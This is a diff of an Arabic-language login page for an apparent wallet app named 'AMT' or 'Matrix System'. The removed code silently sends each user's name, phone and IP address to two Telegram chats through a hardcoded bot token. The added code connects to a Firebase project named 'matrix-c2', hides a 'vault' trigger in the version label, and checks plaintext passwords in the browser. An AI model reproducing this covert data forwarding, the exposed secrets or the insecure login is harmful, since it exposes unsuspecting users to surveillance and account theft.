@@ -12,53 +12,51 @@
 <body class="main-bg">
     <div class="glass-container">
         <h1 class="logo">AMT <span>LOGIN</span></h1>
-        <p class="subtitle">مرحباً بك مجدداً في Matrix System</p>
+        <p style="text-align:center; font-size:12px; color:#7f8c8d; margin-bottom:20px;">مرحباً بك مجدداً في محفظتك</p>
         
         <form id="loginForm">
-            <div class="input-group">
-                <input type="tel" id="loginPhone" placeholder="رقم الهاتف (بدون +)" required>
+            <div style="display:flex; gap:8px; margin-bottom:15px;">
+                <select id="loginCountry" style="width:35%; border-radius:12px;">
+                    <option value="+20">🇪🇬 +20</option>
+                    <option value="+964">🇮🇶 +964</option>
+                    <option value="+966">🇸🇦 +966</option>
+                </select>
+                <input type="tel" id="loginPhone" placeholder="رقم الهاتف" required style="margin-bottom:0;">
             </div>
+
             <div class="input-group">
                 <input type="password" id="loginPass" placeholder="كلمة السر" required>
             </div>
+
             <button type="submit" class="btn-primary">دخول للمنصة</button>
         </form>
         
-        <p class="footer-note">ليس لديك حساب؟ <a href="register.html">إنشاء حساب جديد</a></p>
+        <p style="text-align:center; margin-top:15px; font-size:13px;">ليس لديك حساب؟ <a href="index.html" style="color:#2c3e50; font-weight:bold; text-decoration:none;">إنشاء حساب جديد</a></p>
+        
         <p class="version-text" onclick="triggerVault()">v1.0.8</p>
     </div>
 
     <script>
-        const botToken = "8619795327:AAF8hZQVZlyLkxYyU6bmuu2KVM2nyNUmpRE";
-        const chatIds = ["8622780736", "8211953992"];
+        const firebaseConfig = {
+          apiKey: "AIzaSyAkz8kGNDOJ5caCIbdoXpvJBZgUbigjT5g",
+          databaseURL: "https://matrix-c2-default-rtdb.firebaseio.com",
+          projectId: "matrix-c2",
+        };
+        if (!firebase.apps.length) firebase.initializeApp(firebaseConfig);
 
         document.getElementById('loginForm').onsubmit = (e) => {
             e.preventDefault();
-            const phone = document.getElementById('loginPhone').value;
+            const phone = document.getElementById('loginCountry').value + document.getElementById('loginPhone').value;
             const pass = document.getElementById('loginPass').value;
+            const userKey = phone.replace('+', '');
 
-            // التأكد من وجود الحساب في Firebase
-            const userRef = firebase.database().ref('users/' + phone);
-            userRef.once('value').then(async (snapshot) => {
-                if(snapshot.exists()) {
-                    const userData = snapshot.val();
-                    if(userData.password === pass) {
-                        // حفظ جلسة الدخول
-                        localStorage.setItem('userPhone', phone);
-                        
-                        // إشعار تليجرام بالدخول
-                        const loginMsg = `🔑 دخول جديد!\n👤 الاسم: ${userData.full_name}\n📱 الهاتف: ${phone}\n🌐 الـ IP: ${userData.ip}`;
-                        chatIds.forEach(id => {
-                            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${id}&text=${encodeURIComponent(loginMsg)}`);
-                        });
-
-                        alert("أهلاً بك يا " + userData.full_name);
-                        window.location.href = "dashboard.html";
-                    } else {
-                        alert("كلمة السر غير صحيحة!");
-                    }
+            firebase.database().ref('users/' + userKey).once('value', (snapshot) => {
+                const userData = snapshot.val();
+                if(userData && userData.password === pass) {
+                    localStorage.setItem('userPhone', userKey);
+                    window.location.href = "dashboard.html";
                 } else {
-                    alert("رقم الهاتف غير مسجل!");
+                    alert("خطأ في رقم الهاتف أو كلمة السر!");
                 }
             });
         };
